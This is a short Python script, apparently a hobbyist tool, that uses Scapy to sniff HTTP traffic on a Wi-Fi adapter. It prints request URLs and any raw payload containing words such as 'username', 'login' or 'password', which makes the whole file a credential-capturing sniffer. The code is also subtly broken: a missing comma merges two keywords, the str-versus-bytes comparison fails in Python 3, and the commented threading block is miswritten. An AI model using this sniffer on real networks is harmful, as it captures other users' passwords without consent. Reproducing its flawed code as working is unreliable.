from scapy.layers import http

import scapy.all as scap
KEYWORDS = ["username", "user", "login", "password" "pass"]


class Sniffer:
    def __init__(self, interface):
        self.interface = interface

    def get_url(self, packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def sniffed_packets(self, packet):
        if packet.haslayer(http.HTTPRequest):
            url = self.get_url(packet)
            print(f"<+> Request HTTP protocol >>> {url}")
        if packet.haslayer(scap.Raw):
            sniff_result = packet[scap.Raw].load
            for key in KEYWORDS:
                if key in sniff_result:
                    print("\n", "\n")
                    print(f"<+> USER/PASSWORD {sniff_result}")
                    print("\n", "\n")

    def sniff(self, interface):
        scap.sniff(iface=interface, store=False, prn=self.sniffed_packets)


def main():
    inter = "Microsoft Wi-Fi Direct Virtual Adapter"
    S = Sniffer(inter)
    S.sniff(inter)
    """for th in range(cpu_count()):
        thread = Thread(target=S.sniff(inter), args=(th,))
        thread.start()"""


if __name__ == '__main__':
    main()
